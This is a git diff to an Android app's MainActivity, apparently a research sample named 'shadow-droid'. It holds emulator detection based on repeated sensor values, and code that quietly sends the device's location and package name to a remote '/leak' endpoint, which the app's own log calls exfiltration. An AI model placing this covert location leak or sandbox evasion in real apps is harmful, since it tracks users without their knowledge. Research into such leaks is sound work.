@@ -9,12 +9,14 @@ import android.hardware.SensorEvent
 import android.hardware.SensorEventListener
 import android.hardware.SensorManager
 import android.location.Criteria
+import android.location.Location
+import android.location.LocationListener
 import android.location.LocationManager
-import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.RequiresPermission
+import androidx.appcompat.app.AppCompatActivity
 import io.ktor.client.*
 import io.ktor.client.engine.cio.*
 import io.ktor.client.request.forms.*
@@ -55,7 +57,7 @@ class MainActivity : AppCompatActivity(), SensorEventListener {
     }
 
     override fun onSensorChanged(event: SensorEvent?) {
-        event?.let { event ->
+        event?.let { _event ->
             if (sensorValues.size >= 10) {
                 // We consider the values to be emulated if one of the float arrays
                 // has the same values as another array.
@@ -69,7 +71,7 @@ class MainActivity : AppCompatActivity(), SensorEventListener {
             } else {
                 // We do not own the event object, nor any objects inside it (like it.values).
                 // These objects will be reused, so we make a copy instead.
-                sensorValues.add(event.values.copyOf())
+                sensorValues.add(_event.values.copyOf())
             }
         }
     }
@@ -97,28 +99,38 @@ class MainActivity : AppCompatActivity(), SensorEventListener {
         val locationManager = getSystemService(LocationManager::class.java)
         val provider : String? = locationManager.getBestProvider(Criteria(), true)
         provider?.let {
-            locationManager.requestSingleUpdate(provider, { loc ->
-                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
-                CoroutineScope(Dispatchers.IO).launch {
-                    try {
-                        HttpClient(CIO).use { client ->
-                            val response = client.submitForm<HttpResponse>(
-                                url,
-                                Parameters.build {
-                                    append("appname", packageName)
-                                    append("latitude", "${loc.latitude}")
-                                    append("longitude", "${loc.longitude}")
-                                },
-                                false
-                            )
-                            Log.d(TAG, "Response status: ${response.status}")
-                            Log.d(TAG, "Response: ${response.readText()}")
+            locationManager.requestSingleUpdate(provider, object : LocationListener {
+                override fun onProviderEnabled(provider: String) {}
+
+                override fun onProviderDisabled(provider: String) {}
+
+                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+
+                override fun onLocationChanged(location: Location) {
+                    val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
+                    CoroutineScope(Dispatchers.IO).launch {
+                        try {
+                            HttpClient(CIO).use { client ->
+                                val response = client.submitForm<HttpResponse>(
+                                    url,
+                                    Parameters.build {
+                                        append("appname", packageName)
+                                        append("latitude", "${location.latitude}")
+                                        append("longitude", "${location.longitude}")
+                                    },
+                                    false
+                                )
+                                Log.d(TAG, "Response status: ${response.status}")
+                                Log.d(TAG, "Response: ${response.readText()}")
+                            }
+                        } catch (e: Exception) {
+                            Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                            e.printStackTrace()
                         }
-                    } catch (e: Exception) {
-                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                     }
                 }
+
             }, null)
-        }
+        } ?: Log.d(TAG, "No provider; cannot send location")
     }
 }
